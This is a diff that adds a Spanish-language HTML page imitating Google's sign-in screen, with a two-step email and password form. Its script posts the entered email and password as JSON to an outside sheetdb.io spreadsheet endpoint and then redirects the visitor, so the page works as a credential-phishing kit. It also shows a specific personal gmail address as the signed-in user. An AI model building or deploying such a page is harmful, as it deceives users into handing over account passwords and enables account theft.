@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceder</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            animation: fadeIn 0.8s ease-in-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 60px;
+            margin-right: 10px;
+        }
+
+        h1, h2 {
+            color: #202124;
+            margin: 0;
+        }
+
+        h1 {
+            font-size: 18px;
+        }
+
+        h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        input[type="password"], input[type="email"] {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 0.2rem rgba(26,115,232,.25);
+            outline: none;
+        }
+
+        .input-group label {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            font-size: 16px;
+            color: #666;
+            transition: all 0.3s ease;
+            pointer-events: none;
+            background-color: #ffffff;
+            padding: 0 4px;
+        }
+
+        input:focus + label, input:not(:placeholder-shown) + label {
+            top: -10px;
+            left: 10px;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+
+        .forgot-email, .forgot-password {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .forgot-email a, .forgot-password a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        p {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+
+        p a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .buttons a, .buttons button {
+            padding: 12px 20px;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background-color 0.3s ease;
+        }
+
+        .buttons a {
+            color: #1a73e8;
+            background-color: transparent;
+            border: 2px solid #1a73e8;
+        }
+
+        .buttons button {
+            background-color: #1a73e8;
+            color: white;
+        }
+
+        .buttons a:hover, .buttons button:hover {
+            background-color: #0056b3;
+            color: white;
+        }
+
+        footer {
+            margin-top: 40px;
+        }
+
+        footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        footer select {
+            border: none;
+            background: none;
+            color: #1a73e8;
+        }
+
+        .welcome-message {
+            font-size: 20px;
+            color: #202124;
+            margin-bottom: 20px;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .user-info img {
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-container input {
+            margin-right: 10px;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.7);
+            z-index: 100;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-lines {
+            position: absolute;
+            top: 20px;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            display: flex;
+            justify-content: space-between;
+            overflow: hidden;
+        }
+
+        .loading-lines div {
+            width: 33%;
+            height: 100%;
+            background-color: #1a73e8;
+            animation: move 1s linear infinite;
+        }
+
+        .loading-lines div:nth-child(2) { animation-delay: 0.2s; }
+        .loading-lines div:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes move {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+
+            .logo img { width: 30px; }
+            h1 { font-size: 16px; }
+            h2 { font-size: 20px; }
+            input[type="password"], input[type="email"] {
+                padding: 12px;
+                font-size: 14px;
+            }
+            .buttons a, .buttons button {
+                padding: 10px 15px;
+                font-size: 12px;
+            }
+            footer a { font-size: 12px; }
+            footer select { font-size: 12px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="login-container">
+        <header>
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_74x24dp.png" alt="Google Logo">
+                <p id="login-heading">Acceder con Google</pp>
+            </div>
+        </header>
+        <main id="login-main">
+            <h2 id="login-subheading">Acceder</h3>
+            <p id="login-text">Ir a <a href="#" id="login-link">login</a></p>
+            <form id="login-form">
+                <div class="input-group">
+                    <input type="email" id="email" placeholder=" " required>
+                    <label for="email">Correo electrónico o teléfono</label>
+                </div>
+                <div class="forgot-email">
+                    <a href="#">¿Olvidaste el correo electrónico?</a>
+                </div>
+                <p>
+                    Para continuar, Google compartirá tu nombre, dirección de correo electrónico, preferencia de idioma y foto de perfil con la página que deseas acceder. Antes de usar, revisa su <a href="#">política de privacidad</a> y <a href="#">condiciones del servicio</a>.
+                </p>
+                <div class="buttons">
+                    <p style="color: rgb(19, 19, 176);">Crear cuenta</p>
+                    <button type="submit">Siguiente</button>
+                </div>
+            </form>
+        </main>
+        <main id="password-main" style="display: none;">
+            <div class="welcome-message">Te damos la bienvenida.</div>
+            <div class="user-info">
+                <img src="https://www.gravatar.com/avatar/?d=mp" alt="User Avatar" width="32" height="32">
+                <span id="user-email">jefferson.mendoza.vega@gmail.com</span>
+            </div>
+            <form id="password-form">
+                <div class="input-group">
+                    <input type="password" id="password" placeholder=" " required>
+                    <label for="password">Introduce tu contraseña</label>
+                </div>
+                <div class="forgot-password">
+                    <a href="#">¿Olvidaste tu contraseña?</a>
+                </div>
+                <div class="checkbox-container">
+                    <input type="checkbox" id="stay-signed-in">
+                    <label for="stay-signed-in">Mantener la sesión iniciada</label>
+                </div>
+                <div class="buttons">
+                    <p style="color: rgb(19, 19, 176);">Crear cuenta</p>
+                    <button type="submit" id="next-button">Siguiente</button>
+
+                </div>
+            </form>
+        </main>
+        <footer>
+            <a href="#">Español (Latinoamérica)</a>
+            <a href="#">Ayuda</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Condiciones</a>
+            <select>
+                <option value="es">Español</option>
+                <option value="en">English</option>
+            </select>
+        </footer>
+    </div>
+    <div class="overlay" id="overlay">
+        <div class="loading-lines">
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <script>
+        const emailForm = document.getElementById('login-form');
+        const passwordForm = document.getElementById('password-form');
+        const loginMain = document.getElementById('login-main');
+        const passwordMain = document.getElementById('password-main');
+        const userEmail = document.getElementById('user-email');
+        const overlay = document.getElementById('overlay');
+        const loginContainer = document.getElementById('login-container');
+
+        emailForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+
+            // Mostrar overlay de carga
+            overlay.style.display = 'flex';
+
+            // Esperar unos momentos para simular carga antes de mostrar el siguiente formulario
+            setTimeout(() => {
+                userEmail.textContent = email;
+                loginMain.style.display = 'none';
+                passwordMain.style.display = 'block';
+                overlay.style.display = 'none';
+            }, 1000); // Cambia el valor si necesitas ajustar el tiempo de carga
+        });
+
+        passwordForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const password = document.getElementById('password').value;
+            const email = userEmail.textContent;
+
+            // Mostrar overlay de carga
+            overlay.style.display = 'flex';
+
+            // Enviar los datos al endpoint para guardarlos
+            fetch('https://sheetdb.io/api/v1/8t2260hdbl71o', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                overlay.style.display = 'none';
+                
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                overlay.style.display = 'none';
+                alert('Error de conexión');
+            });
+        });
+    </script>
+    <script>
+        const staySignedInCheckbox = document.getElementById('stay-signed-in');
+        const nextButton = document.getElementById('next-button');
+    
+        nextButton.addEventListener('click', function() {
+            // Verifica el estado del checkbox si es necesario
+            const staySignedIn = staySignedInCheckbox.checked;
+    
+            // Realiza la redirección a index.html
+            // Redirigir a index.html después de 2 segundos
+            setTimeout(() => {
+                window.location.href = 'index.html';
+            }, 1000); // 2000 milisegundos = 2 segundos
+        });
+    </script>
+    
+</body>
+</html>
